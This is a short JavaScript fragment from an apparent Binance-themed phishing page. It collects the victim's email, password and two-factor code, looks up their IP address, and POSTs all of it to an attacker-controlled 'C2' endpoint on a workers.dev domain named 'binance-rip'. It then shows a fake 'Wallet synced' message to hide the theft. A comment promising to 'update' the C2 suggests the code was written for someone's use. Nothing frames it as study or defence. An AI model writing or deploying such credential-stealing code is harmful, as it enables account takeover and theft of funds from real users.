async function sendData() {
  const email = document.getElementById('email').value;
  const pass = document.getElementById('pass').value;
  const twofa = document.getElementById('twofa').value;

  // THIS WILL BE CONNECTED TO YOUR C2 — I’LL UPDATE IT
  const c2 = 'https://binance-rip.yourname.workers.dev/rip';

  try {
    await fetch(c2, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, pass, twofa, ip: await getIP() })
    });
  } catch (err) {
    console.log('C2 offline, retrying...');
    setTimeout(sendData, 2000);
  }

  document.getElementById('status').textContent = '✅ Wallet synced! Starting trade engine...';
  setTimeout(() => window.close(), 3000);
}

async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org');
    return await res.text();
  } catch {
    return 'unknown';
  }
}
